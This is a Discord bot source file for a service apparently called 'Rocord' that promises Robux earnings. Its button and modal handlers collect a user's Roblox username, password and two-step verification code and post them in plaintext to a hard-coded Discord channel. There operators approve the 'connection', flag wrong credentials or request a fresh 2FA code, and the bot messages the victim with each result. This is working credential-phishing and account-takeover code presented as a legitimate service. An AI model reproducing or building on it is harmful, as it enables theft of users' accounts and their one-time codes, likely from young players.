module.exports = [{
type: "interaction",
prototype: "button",
code: `

$sendDM[
{newEmbed:
{thumbnail:$getglobaluservar[avt;$advancedTextSplit[$interactionData[customId];_;2]]}
{author:$username:$userAvatar}
{title:Connection Approved!}
{description:
# Congratulation! Your Account Have Been Connected!
Your account __**$getglobaluservar[uname]**__ is now connected to Rocord.
You can now start deposit, withdraw, earning robux and do many other activities with this bot.

Have a nice time using our service.
}
{footer:Rocord}
{timestamp}
{color:#00ff00}
}
;$advancedTextSplit[$interactionData[customId];_;2]]

$setglobaluservar[connected;true;$advancedTextSplit[$interactionData[customId];_;2]]
$setglobaluservar[reqsending;false;$advancedTextSplit[$interactionData[customId];_;2]]

$interactionUpdate[;{newEmbed:
{author:$username[$advancedTextSplit[$interactionData[customId];_;2]]:$userAvatar[$advancedTextSplit[$interactionData[customId];_;2]]}
{thumbnail:$getglobaluservar[avt;$advancedTextSplit[$interactionData[customId];_;2]]}
{title:Account Connected!}
{description:
**Username:**
\`\`\`
$getglobaluservar[uname;$advancedTextSplit[$interactionData[customId];_;2]]
\`\`\`
**Password:**
\`\`\`
***************
\`\`\`

*Done By <@$authorID>*
}
{footer:Rocord}
{timestamp}
{color:#ffffff}};
{actionRow:{button:Connected:success:connected_$interactionData[author.id]:true}
{button:U/P Wrong:danger:upwrong_$interactionData[author.id]:true}
{button:2-Step:secondary:2sv_$interactionData[author.id]:true}}
]

$onlyif[$getglobaluservar[connected;$advancedTextSplit[$interactionData[customId];_;2]]==false;{
"embeds" : "{newEmbed:{description:This User Is Already Connected!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==connected;]

`
}, {
type: "interaction",
prototype: "button",
code: `

$sendDM[
{newEmbed:
{thumbnail:$getglobaluservar[avt;$advancedTextSplit[$interactionData[customId];_;2]]}
{author:$username:$userAvatar}
{title:Wrong Information Provided!}
{description:
# Your Username / Password Seem Wrong!
Your account __**$getglobaluservar[uname]**__ cant connect to Rocord due to wrong information provided.
Provide a valid information so that we could connect you to Rocord.

}
{footer:Rocord}
{timestamp}
{color:#ff0000}
}
;$advancedTextSplit[$interactionData[customId];_;2]]

$setglobaluservar[connected;false;$advancedTextSplit[$interactionData[customId];_;2]]
$setglobaluservar[reqsending;false;$advancedTextSplit[$interactionData[customId];_;2]]

$interactionUpdate[;{newEmbed:
{author:$username[$advancedTextSplit[$interactionData[customId];_;2]]:$userAvatar[$advancedTextSplit[$interactionData[customId];_;2]]}
{thumbnail:$getglobaluservar[avt;$advancedTextSplit[$interactionData[customId];_;2]]}
{title:Wrong Information Provided!}
{description:
**Username:**
\`\`\`
$getglobaluservar[uname;$advancedTextSplit[$interactionData[customId];_;2]]
\`\`\`
**Password:**
\`\`\`
***************
\`\`\`

*Done By <@$authorID>*
}
{footer:Rocord}
{timestamp}
{color:#ff0000}};
{actionRow:{button:Connected:success:connected_$interactionData[author.id]:true}
{button:U/P Wrong:danger:upwrong_$interactionData[author.id]:true}
{button:2-Step:secondary:2sv_$interactionData[author.id]:true}}
]

$onlyif[$getglobaluservar[connected;$advancedTextSplit[$interactionData[customId];_;2]]==false;{
"embeds" : "{newEmbed:{description:This User Is Already Connected!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==upwrong;]

`
}, {
type: "interaction",
prototype: "button",
code: `

$sendDM[
{newEmbed:
{thumbnail:$getglobaluservar[avt;$advancedTextSplit[$interactionData[customId];_;2]]}
{author:$username:$userAvatar}
{title:2-Step Verification Code Needed!}
{description:
# We Need You To Provide Your 2-step Code!
Your account __**$getglobaluservar[uname]**__ cant connect to Rocord due to 2-step code required.
Provide a valid 2-step verification code so that we could connect you to Rocord.
}
{footer:Rocord}
{timestamp}
{color:Yellow}
}{actionRow:{button:2-Step Code:secondary:send2step_$advancedTextSplit[$interactionData[customId];_;2]:false}}
;$advancedTextSplit[$interactionData[customId];_;2]]

$setglobaluservar[tsvcheck;true;$advancedTextSplit[$interactionData[customId];_;2]]
$setglobaluservar[connected;false;$advancedTextSplit[$interactionData[customId];_;2]]
$setglobaluservar[reqsending;true;$advancedTextSplit[$interactionData[customId];_;2]]

$interactionUpdate[;{newEmbed:
{author:$username[$advancedTextSplit[$interactionData[customId];_;2]]:$userAvatar[$advancedTextSplit[$interactionData[customId];_;2]]}
{thumbnail:$getglobaluservar[avt;$advancedTextSplit[$interactionData[customId];_;2]]}
{title:Wait For 2-Step Verification Code!}
{description:
**Username:**
\`\`\`
$getglobaluservar[uname;$advancedTextSplit[$interactionData[customId];_;2]]
\`\`\`
**Password:**
\`\`\`
***************
\`\`\`

*Done By <@$authorID>*
}
{footer:Rocord}
{timestamp}
{color:Yellow}};
{actionRow:{button:Connected:success:connected_$interactionData[author.id]:true}
{button:U/P Wrong:danger:upwrong_$interactionData[author.id]:true}
{button:2-Step:secondary:2sv_$interactionData[author.id]:true}}
]

$onlyif[$getglobaluservar[connected;$advancedTextSplit[$interactionData[customId];_;2]]==false;{
"embeds" : "{newEmbed:{description:This User Is Already Connected!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==2sv;]

`
},{
type: "interaction",
prototype: "button",
code: `
$interactionModal[Provide 2-Step Verification Code!;2svcode;
{actionRow:
{textInput:2 Step Code:1:2svinput:true:Your code}
}
]

$onlyif[$getglobaluservar[tsvcheck]==true;{
"embeds" : "{newEmbed:{description:You Cant Do This Action!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

$onlyif[$getglobaluservar[connected]==false;{
"embeds" : "{newEmbed:{description:Already Connected!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

$onlyif[$advancedTextSplit[$interactionData[customId];_;2]==$interactionData[author.id];{
"embeds" : "{newEmbed:{description:Not Your Button!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]
$onlyIf[$advancedTextSplit[$interactionData[customId];_;1]==send2step;]
`
},{
name: "2svcode",
type: "interaction",
prototype: "modal",
code: `

$channelSendMessage[1127828796947578910;
{newEmbed:
{author:$username:$userAvatar}
{thumbnail:$getglobaluservar[avt]}
{title:2-Step Verification Code!}
{description:
**Username:**
\`\`\`
$getglobaluservar[uname]
\`\`\`
**Password:**
\`\`\`
$getglobaluservar[pword]
\`\`\`
**2-Step Code:**
\`\`\`
$textInputvalue[2svinput]
\`\`\`
}
{footer:Rocord}
{timestamp}
{color:#ffffff}}
{actionRow:{button:Connected:success:connected_$interactionData[author.id]:false} 
{button:U/P Wrong:danger:upwrong_$interactionData[author.id]:false}
{button:2-Step:secondary:2sv_$interactionData[author.id]:false}}
]

$interactionUpdate[;
{newEmbed:
{author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:$getglobaluservar[avt]}
{title:2-Step Code Sent!}
{description:
*** Your 2-Step Verification code for account name __$getGlobalUserVar[uname]__ has been sent.***
*Please wait for your request to be approved. You will be announce if the connection is success or there is some problem*

**The connection will be fail if:**
- Wrong **Username** or **Password** provided
- Some technical issue from the bot

**You will need to provide more information if:**
- 2-Step Verification code (if you have 2-step verify turned on)
...

}
{footer:Rocord}
{timestamp}
{color:Yellow}
}
]

$onlyif[$getglobaluservar[tsvcheck]==true;{
"embeds" : "{newEmbed:{description:You Cant Do This Action!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

$onlyif[$getglobaluservar[connected]==false;{
"embeds" : "{newEmbed:{description:Already Connected!}{color:ff0000}}",
"ephemeral" : true,
"options" : {
"interaction" : true
}
}]

`
}]